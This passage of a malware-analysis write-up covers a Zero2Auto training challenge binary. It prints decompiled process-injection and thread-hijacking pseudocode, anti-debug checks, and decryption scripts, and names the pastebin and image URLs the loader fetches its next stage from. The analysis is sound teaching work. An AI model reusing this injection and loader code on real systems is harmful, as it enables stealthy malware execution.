&quot;key&quot; being &quot;lpRsrcLock+0xC&quot; till next 15bytes in hex ie. &quot;6b6b64355964504d32345642586d69&quot;) \n\t// to get an PE file(next payload) at &#039;lpAlloc_mem_for_stg02&#039; \n \n\t// pass decrypted pe file to this funtions`\n\tsub_401000(lpAlloc_mem_for_stg02); \n\treturn 0;\n}\n\n\nthis binary starts off by decrypting the needed module and win32API function name strings using sub_401030 (which performs ROT13 on encrypted string against abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890./=), to dynamically load them using LoadLibraryA followed by GetProcAddress\n\n\nfunctions dynamically loaded are FindResourceA, LoadResource, SizeOfResource, LockResource, VirtualAlloc from kernel32dll\n\n\nmoving on, we see it finds(FindReosurceA), loads(LoadResource), gets the size(SizeOfResource), lastly locks(LockResource) a resource from .rsrc section with ID = 101(0x65) of type RT_RCDATA(0xA) with size 0x1541C\n\n\nthen it calculates the size(based on lpRsrcLock+0x8 ie. 0x2200) for the data after offset lpRsrcLock+0x1C from resource ie. 0x1541C - 0x1C =&gt; 0x15400, then allocates(VirtualAlloc) that much space to fill it with the buffer lpRsrcLock+0x1C using sub_402DB0\n\n\nmoving on, we see the constant 256 a bunch of times along with loops containing enough arithmetic instruction, with a quick search it reveals that this is RC4 decryption routine, not going deep into algorithm itself:\n\nit’s a 3 staged stream cipher algorithm consisting of\nKSA(Key Scheduling Algorithm): which initializes a list of values from 0 to 256 which is then swapped with value based on calculation done with key\nPRGA(Pseudo-Random Generation Algorithm): generates and outputs the keystream using the scrambled list we had, and generates as many bytes needed up to 256\nXOR Operation: XORing each byte of ciphertext/plaintext with a byte of the keystream generated\n\n\n\nin this case the key is the next 15 bytes from lpRsrcLock+0xC ie. 6b6b64355964504d32345642586d69 when the decryption routine finishes we’re left with an executable in previously allocated memory, which is then passed as an only argument to sub_401000\n\n\n\nInside sub_401000()\nThis Function gonna perform PROCESS INJECTION using THREAD CONTEXT HIJACKING in order to inject/execute the payload supplied as argument:\n\nFollowing is the modified/edited Pseudocode of sub_401000() based on IDA decompiler output:\n\nint __thiscall sub_401000(_IMAGE_DOS_HEADER *stg02) {\n\tstg02_nt_Headers = stg02 + stg02-&gt;e_lfanew;\n\tptr_stg02_nt_headers = stg02_nt_headers;\n \n\t// get current running executable&#039;s full path\n\tGetModuleFileNameA(NULL, lpFilename_self, 0x400); \n\t\n\t// verify if stg02 payload is a legit PE file by verifying \n\tif stg02_nt_headers-&gt;Signature != 0x4550\n\t\treturn 1;\n \n\tpossible_memset_4025B0(&amp;lpStartupInfo, 0, 0x44);\n \n\t// now create the another process of itself(lpFilename) in suspended state(4) and store process information in &#039;lpProcessInfo&#039; struct\n\tdecryptStr_401300(str_kernel32dll);\n\tdecryptStr_401300(str_CreatesProcessA);\n\thMod = LoadLibraryA(str_kernel32dll);\n\tCreateProcessA = GetProcAddress(hMod, str_CreatesProcessA);\n\tif ( !CreateProcessA(lpFilename_self, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &amp;lpStartupInfo, &amp;lpProcessInfo) )\n\t    return 1;\n \n\tdecryptStr_401300(str_VirtualAlloc);\n\thMod_1 = LoadLibraryA(str_kernel32dll);\n\tVirtualAlloc = GetProcAddress(hMod_1, str_VirtualAlloc);\n\tlpContext = VirtualAlloc(0, 4, MEM_COMMIT, PAGE_READWRITE);\n\tlpContext-&gt;ContextFlags = 0x10007;\n \n\t// get the thread context of thread inside suspended process\n\tdecryptStr_401300(str_GetThreadContext);\n\thMod_2 = LoadLibraryA(str_kernel32dll);\n\tGetThreadContext = GetProcAddress(hMod_2, str_GetThreadContext);\n\tif ( !GetThreadContext(lpProcessInfo.hThread, lpContext) )\n\t\treturn 1;\n \n\tdecryptStr_401300(str_ReadProcessMemory);\n\thMod_3 = LoadLibraryA(str_kernel32dll);\n\tReadProcessMemory = GetProcAddress(hMod_3, str_ReadProcessMemory);\n\t\n\tdecryptStr_401300(str_WriteProcessMemory);\n\thMod_4 = LoadLibraryA(str_kernel32dll);\n\tWriteProcessMemory = GetProcAddress(hMod_4, str_WriteProcessMemory);\n \n\t// copy the imageBaseAddress(&#039;lpContext-&gt;Ebx + 0x8&#039; ie. PEB-&gt;ImageBaseAddress) to &#039;lpImageBaseOfSusProc&#039;\n\t// lpContext-&gt;Ebx = at the time of suspended state this register holds the address of PEB\n\tReadProcessMemory(lpProcessInfo-&gt;hProcess, lpContext-&gt;Ebx + 0x8, lpImageBaseOfSusProc, 0x4, NULL);\n \n\t// allocate memory in suspended process with base address 0x400000(stg02+0x134) of size 0x18000(stg02+0x150) with RWX(0x40) access\n\tdecryptStr_401300(str_VirtualAllocEx);\n\thMod_5 = LoadLibraryA(str_kernel32dll);\n\tVirtualAllocEx = GetProcAddress(hMod_5, str_VirtualAllocEx);\n\tlpMemInTargetProc = VirtualAllocEx(lpProcessInfo.hProcess,\n\t\t\t\t\t   stg02_nt_headers-&gt;OptionalHeader.ImageBase,\n\t\t\t\t\t   stg02_nt_headers-&gt;OptionalHeader.SizeOfImage,\n\t\t\t\t\t   0x3000,\n\t\t\t\t\t   PAGE_EXECUTE_READWRITE);\n \n\t// first gonna write the header of stg02 in memory allocated inside suspended process\n\tWriteProcessMemory(lpProcessInfo.hProcess, lpMemInTargetProc, stg02, stg02_nt_headers-&gt;OptionalHeader.SizeOfHeaders, 0);\n \n\t// if number of sections in stg02 is not 0\n\tif ( ptr_stg02_nt_headers-&gt;FileHeader.NumberOfSections ) {\n\t\tdo {\n\t\t  // gonna run a loop to write all section of stg02 to the suspended process memory\n\t\t} while ( noOfSectionWritten &lt; ptr_stg02_nt_headers-&gt;FileHeader.NumberOfSections );\n\t}\n \n\t// set the PEB-&gt;ImageBaseAddress(lpContext-&gt;Ebx+0x8) of supended process to imageBaseAddress of stg02 \n\tWriteProcessMemory(lpProcessInfo.hProcess, lpContext-&gt;Ebx + 0x8, stg02_nt_headers-&gt;OptionalHeader.ImageBase, 4, 0);\n\t\n\tdecryptStr_401300(str_SetThreadContext);\n\thMod_6 = LoadLibraryA(str_kernel32dll);\n\tSetThreadContext = GetProcAddress(hMod_6, str_SetThreadContext);\n\t\n\tdecryptStr_401300(str_ResumeThread);\n\thMod_7 = LoadLibraryA(str_kernel32dll);\n\tResumeThread = GetProcAddress(hMod_7, str_ResumeThread);\n \n\t// now set: lpContext+Eax = original entry point of stg02 ie. 0x4022f3(main)\n\tlpContext-&gt;Eax = lpMemInTargetProc + ptr_stg02_nt_headers-&gt;OptionalHeader.AddressOfEntryPoint;\n\t// gonna set thread context of suspend, after modifying eax in it\n\tSetThreadContext(lpProcessInfo.hThread, lpContext);\n\tResumeThread(lpProcessInfo.hThread);    // thne resume the suspended thread\n\treturn 0;\n}\n\n\ncreates a child process of it’s own in suspended state using CreateProcessA()\n\n\nthen, get the thread Context of thread inside suspended process using GetThreadContext() in order to manipulate it later\n\n\nallocate some memory in suspended process using VirtualAllocEx with base address 0x400000(stg02_nt_headers-&gt;OptionalHeader.ImageBase)\n\n\nthe using loop, this will write the payload section-by-section to the allocated memory using WriteProcessMemory()\n\n\nafter injecting the payload in target process,  this set the thread context back using SetThreadContext() after modifying the lpContext-&gt;Eax to 0x4022F3 (ie. original entry point(main) of the stage02)\n\n\nthen resume the suspended thread using ResumeThread(), which will immediately resume execution of injected payload from earlier set entry point\n\n\n\n\n                  \n                  TIP \n                  \n                \n\nTo break on the executing/injected payload in target process\n\nattach the targeted process to x32dbg, then navigate to Memory Map tab , then Follow in Dump the memory(payload address of 0x400000 with size 0x18000), you’ll see an executable header(4D5A), form here go to the entry point offset then main in this case its 0x401EA0 then Follow in Disassembler, put a break point there\nafter resuming the thread from parent process, simply resume the debugger of child process and you’ll jump to your intended breakpoint\n\n\n\n\nConclusion\nNow that we know, how the decryption of stage-02 is taking place using RC4 algorithm, also the ‘key’ for decryption and how the payload is injected and resumed to execute it and how put a breakpoint to it. Now in the part-II we’ll focus on working of stage 02\nSee you there :)\n\nstring decryption performed by sub_401300\n# decryptStr_401300.py\n# Author: ME :D\n \n# this decryption routine, kinda performs string decryption similar to ROT 13 \n# but on given set of chararcters ie. &#039;all_chars&#039;\ndef decrypt(enc_str):\n    dec_str = &quot;&quot;\n    all_chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890./=&quot;\n    if len(enc_str) &gt; 0:\n        for i in range(len(enc_str)):\n            if enc_str[i] in all_chars:\n                index_of_chr = all_chars.index(enc_str[i])\n                if (index_of_chr + 13) &lt; len(all_chars):\n                    dec_str += all_chars[index_of_chr + 13]\n                else:\n                    dec_str += all_chars[index_of_chr - len(all_chars) + 13]\nreturn dec_str\n \nif __name__ == &quot;__main__&quot;:\n    enc_str = input(&quot;String to decrypt: &quot;)\n    print(&quot;Decrypted Str: &quot;, decrypt(enc_str))\n\nstage02 extraction from .rsrc section and decryption\n# stage02_extraction.py\n# Author: ME :D\n \nimport pefile\nfrom arc4 import ARC4\n \ndef extract_rsrc(pe):\n    for resrc in pe.DIRECTORY_ENTRY_RESOURCE.entries:\n        for entry in resrc.directory.entries:\n            print(&quot;Resource Name:&quot;, entry.name)\t\t\t\t\t\t# name of resource if present\n            print(&quot;Resource ID(Parent):&quot;, entry.id)\t\t\t\t\t# resource id of parent resource\n            print(&quot;Reosurce ID:&quot;, entry.directory.entries[0].id)\t# resource id of this resource\n \n            # get the size of this resource\n            sizeOfRsrc = entry.directory.entries[0].data.struct.Size\n            print(f&quot;Size of resource: {hex(sizeOfRsrc)}&quot;)\n \n            # get the offset of this resource\n            offsetToRsrc = entry.directory.entries[0].data.struct.OffsetToData\n            print(f&quot;Offset to resource: {hex(offsetToRsrc)}&quot;)\n \n            # write the reosurce ot a variable to return\n            rsrc = pe.get_memory_mapped_image()[offsetToRsrc : offsetToRsrc + sizeOfRsrc]\n \n            return rsrc\n \ndef rc4_decrypt(key, data):\n    cipher = ARC4(key)\n    decrypted_data = cipher.decrypt(data)\n    return decrypted_data\n \ndef main():\n    pe = pefile.PE(&quot;main_bin.exe&quot;)\n    extracted_resource = extract_rsrc(pe)\t\t# store the extracted resource\n \n    # RC4 decryption follows with key being 15bytes from 0xC,\n    # and rest of data is to be decrypted\n    decrypted_resource = rc4_decrypt(extracted_resource[0xC:27], extracted_resource[0x1C:])\n    executable = decrypted_resource\n \n    # now write it to a new file\n    with open(&quot;decrypted_Stage02.bin&quot;, &quot;wb&quot;) as f:\n        f.write(executable)\n    \nif &quot;__main__&quot; == __name__:\n    main()\n"},"z2a-ch03-challenge/part02":{"slug":"z2a-ch03-challenge/part02","filePath":"z2a-ch03-challenge/part02.md","title":"Zero2Auto : CH03 Practical Analysis Challenge - Part II","links":[],"tags":["reverse-engineering","zero2auto"],"content":"\nI encourage you to follow this writeup along with your analysis\n\nWelcome back, in this part-II of analysing the challenge binary from Z2A: Ch03 (Practical Analysis) we gonna take a thorough look at the second payload extracted from .rsrc section and injected into another process of stage01 (main_bin.exe). So, let’s get started from the main of this stage..\nInside main()\n\n\n\nfirst gonna grab the file path of itself using GetModuleFileNameA(), to get the executable/file name using sub_404A23 aka strtok(identified by flirt in cutter) using a loop\n\n\nwith filename ie.  main_bin.exe (remember base payload spawned a child process of its own) in hand, it will run another loop to get filename’s length ie. 0xC, then call to sub_401660(CRC32 hashing), where filename being the first argument and second being the filename length, then compare it to a hard-coded hash 0xB925C42D\n\n\nif not equal then continue to call sub_401210(api_hash_resolving) function which takes a module number among three ie.\n\n\n\nand a hard-coded hash, then return the API function name to immediately call it in the next line call eax, in this case it resolves the API hash 8436F795h (IsDebuggerPresent) to check if this process is being debugged or not, if being debugged then exit the process\n\n\nOtherwise, go ahead and call another anti-debugging check function sub_401000\n\n\nInside sub_401000()\n\nthis at first stores a hard-coded set of hash to xmm0 from xmmword_413CE0 variable\nthen move on to resolve some API function using sub_401210 and store them in registers to call’em later, those APIs are\n\n0C1F3B876h ie.CreateToolhelp32Snapshot\n8197004Ch ie. Process32FirstW\n0BC6B67BFh ie. Process32NextW\n\n\nnext it calls CreateToolhelp32Snapshot(call esi) to take snapshot of running process, then if successfully retrieved the handle, then call Process32FirstW where the first arg is handle to snapshot and second arg being a PROCESSENTRY32W struct after setting PROCESSENTRY32W-&gt;dwSize to 0x22C(556),\nthen move on to call Process32FirstW to store the info about first process from snap in PROCESSENTRY32W struct, then lower the string of PROCESSENTRY32W-&gt;szExeName (where every character is 2 bytes(aka UTF-16) means if string is x32dbg.exe then its hex will be 78 00 33 00 32 00 64 00 62 00 67 00 2e 00 65 00 78 00 65 00 ) also look at the dump for x32dbg.exe string\n\n\n\ncontrary to previous sub_401600 call where string chars are only 1byte  long were passed as argument means x32dgb.exe(78 33 32 64 62 67 2e 65 78 65) (pointing this out ‘cause this makes difference in their hash calculated) , then calculate crc32hash to compare the hash the against hardcoded hash set of 4 stored in xmm0 register earlier ie.\n\n7c6ffe70(processhacker.exe)\n47742a22(wireshark.exe)\nd2f05b7d(x32dbg.exe)\n659b537e(x64dbg.exe)\n\n\nif not matched then call Process32NextW to goto the next process in snapshot, and repeat the comparision until any of’em matches, if none of’em matches then exit the function with return value of 0\nOtherwise, if any of running processes calculated hash matches to any of 4, then exit the function with return value of 1\n\nIf last function returned 0(representing not being debugged), then move on to call sub_401D50, which gonna resolve some more API function and store them in for later use, with that done this calls another function sub_401CA0\nInside sub_401CA0()\n\n\n\nfirst set some memory of 0x40 bytes for struct STARTUPINFOA\n\n\nthen move on to decrypt some encrypted data stored in xmmword_413C5C and xmmword_413C6C ie. 7C6D1DBD1FEF1D5DDC6CCCBC5FEF891E and 7CAD7CC86D1DDCAC1C4D1DEF0919FC followed by a decryption loop containing shifting and xor to get string C:\\Windows\\System32\\svchost.exe\n\n\n\nthen create the process svchost.exe using CreateProcessA (which was resolved in earlier function)  in suspended state and returns it PROCESS_INFORMATION struct\n\n\nmoving ahead in main() (see image below), we see a call to GetModuleHandleW with 0 as argument means the module address of its own(stage02) which will be 0x400000\n\n\nthen allocate some memory space of size 0x18000(SizeOfImage of stage02) using VirtualAlloc to copy the stage02 to allocated memory using call sub_4037B0\n\n\nnow this allocates memory of size 0x18000 in suspended svchost.exe using VirtualAllocEx\n\n\n\n\nthen using some loop, gonna perform base relocation(check this out for more on Base Relocation table) for the copied executable based on address returned from VirtualAlloc call, tldr; this performs base relocation which needs to done when PE file is loaded to other address than image base address, in this case this is relocating the copied stage02 binary(present in lpBuffer = lpMem) to adjust the base relocation table with base address equal to address returned from VirtualAlloc\n\n\n\nafter relocation, call to a WriteProcessMemory to write the relocated stage02 in the suspended svchost.exe,\nthen create  a remote thread in svchost.exe with lpStartAddress set to sub_401DC0 relocated to new base address, with dwCreationFlags set to 0 means execute this routine immediately after creating the thread,\n\n\n\n                  \n                  TIP \n                  \n                \n\nHow to break into sub_401DCO ?\n\nNow, in order to analyse this function in x32dbg , again attach the svchost.exe process before calling CreateRemoteThread\nfollow the subroutine address(at offset 0x1DC0) in disassembler and place a breakpoint there\nthen after calling CreateRemoteThread in parent process, jump onto the svchost.exe process and resume the debugger and you’ll break on this function, if all goes good.\n\n\n\nWe’ve covered enough for a quick break, see you back in a bit\n\nInside sub_401DC0()\nWelcome back, i saw there you didn’t had a break, nvm:) let’s carry on..\nNow, let’s examine this function, as this function is executed as a new thread within svchost.exe process\n\n\nfirst gonna resolve 4 API functions related to Internet, then decrypt some encrypted data at xmmword_41C7C , xmmword_413C8C, 0xEA using rotate left by 4, then xor by 0xC5 to get this URL string pastebin.com/raw/mLem9DGk:\n\n\n\nnow pass the decrypted URL as only argument to sub_401290() ie. getDataFromUrl which  gonna reach out to URL and return the data received ie. another URL i.ibb.co/KsfqHym/PNG-02-Copy.png of an image\nagain pass the data received (another URL) to sub_4013A0() as only argument\n\n\nInside sub_4013A0()\n\nget data ie. a PNG file from URL passed to this function using sub_401290() ie. getDataFromUrl,\nthen decrypt the data at qword_413CA4, qword_413CAC by rotating left by 4 then xor by 1F to get string \\output.jpg (keep endians in mind) and convert this string to UTF-16(wide character) by calling MultiByteToWideChar\nresolve 4 more API function using api_hash_resolving_401210 ie. GetTempPathW, CreateDirectoryW, CreateFileW, WriteFile\ngrab temporary directory path using GetTempPathW, to create a folder named cruloader using CreateDirectoryW, within this folder create a file named output.jpg and write the PNG file data received earlier using WriteFile,\nagain decrypt data stored at word_413CCC, qword_413CC4 ie. 8E FF EF BF 5F 6F FE 8E 9F by rotating them left by 4 to xor them by 0x9A to get string redaolurc\nNow using loop it finds the offset of data after string redaolurc (at offset 0x41107) in PNG file ie. 0x41110, then get the size of this data ie. 9384bytes(0x24A8) followed by another loop to decrypt the data ie. xor by 0x61 which reveals another executable say stage03\nagain call sub_401D50  to resolve some api function related to process creation and injection, then spawn another svchost.exe process using same call to sub_401CA0 as earlier, then gonna call sub_401750\n\n\nInside sub_401750()\n\n\nthis functions starts off by capturing the thread Context of newly spawned child svchost.exe process using GetThreadContext(), if function returns success then proceed otherwise return 1\n\n\non success, read the image base address of suspended svchost.exe from PEB-&gt;ImageBaseAddress using ReadProcessMemory()\n\n\non success, will compare the image base address of  stage03 and suspended svchost.exe, if equal then NtUnmapViewOfSection() is called to unmap view at child svchost image base address, otherwise if base addresses are not equal\n\n\nthen move on to allocate memory of size 0x6000(size of image of stage03) in child svchos.exe  using VitualAllocEx where lpBaseAddress set to 0x400000(image base of stage03), if allocation not successfull, then retry memory allocation at any place (lpBaseAddress = 0), if this fails again then exit\n\n\nelsewsie, move on to replace PEB-&gt;ImageBaseAddress of child svchost.exe with allocated memory in svchost.exe using WriteProcessMemory(),\n\n\nthen modify the stage-03 payload by changing value of windows subsystem(IMAGE_NT_HEADERS-&gt;OptionalHeader.Subsytem) from 3(IMAGE_SUBSYSTEM_WINDOWS_CUI) to 2(IMAGE_SUBSYSTEM_WINDOWS_GUI)\n\n\nthen check if previously allocated memory in child svchost.exe  is equal to image base address of stage03 payload, if not equal then relocation is done resp. to address allocated, otherwise if they’re equal\n\n\nthen make a jump to set the thread Context-&gt;eax (of child svchost) to the entry point(at offset 0x126F of stage-03) then call SetThreadContext to set modified thread context in child svchost\n\n\nnow using WriteProcessMemory, VirtualProtectEx gonna map the headers, sections with their protections of stage-03 payload to the allocated memory in child svchost.exe, like this\n\n\n\n\nthen finally call ResumeThread() to continue execution of child svchost.exe from stage03’s entry point\n\n\n\n\n                  \n                  TL;DR \n                  \n                \n\nNow that we know that this stage injects itself in a created svchost process to execute sub_401DC0, which reach out to internet to get an url to get a png file which contains an executable(stage03) file which is then again injected to a created svchost process, next we’ll see what stage03 is capable of.\n\n\n\nStage03 : Inside main()\n\nAll this stage does is display a message box and exit.\n\nHope you had fun reading this walkthrough and I’ll see you in another post.\nTill then have a nice time :)\n\nAPI hash resolve\n# api_name_resolve.py\n# Author: ME :D\n \nimport pefile\nimport zlib\n \ndef api_hash_resolve(dllToLoad, hashToResolve):\n    pe = pefile.PE(f&#039;C:\\Windows\\SysWOW64\\{dllToLoad}&#039;)\n \n    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:\n        if exp.name is not None:\n            if zlib.crc32(exp.name) == int(hashToResolve, 16):\n                print(exp.name.decode())\n \ndef main():\n    dllList = [&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;, &quot;wininet.dll&quot;]\n    \n    print(f&quot;DLLs Available: \\n0: {dllList[0]}\\n1: {dllList[1]}\\n2: {dllList[2]}&quot;)\n    dllNumber = int(input(&quot;Choose DLL number: &quot;))\n    hashToResolve = input(&quot;Hash(hex) to Resolve: &quot;)\n \n    api_hash_resolve(dllList[dllNumber], hashToResolve)\n \nif &quot;__main__&quot; == __name__:\n    main()\n\nStage03 Extraction/Decryption from PNG file data\n# stage03_extraction.py\n# Author: ME :D\n \nimport urllib3\n \nhttp = urllib3.PoolManager()\nres = http.request(&#039;GET&#039;, &#039;i.ibb.co/KsfqHym/PNG-02-Copy.png&#039;)\n \nxored_bytes_for_executable = bytearray()\n \nfor i in res.data[0x41110:]:\n    xored_bytes_for_executable.append(i^0x61)\n \nwith open(&#039;stage03.bin&#039;, &#039;wb&#039;) as f:\n    f.write(xored_bytes_for_executable)\n"}}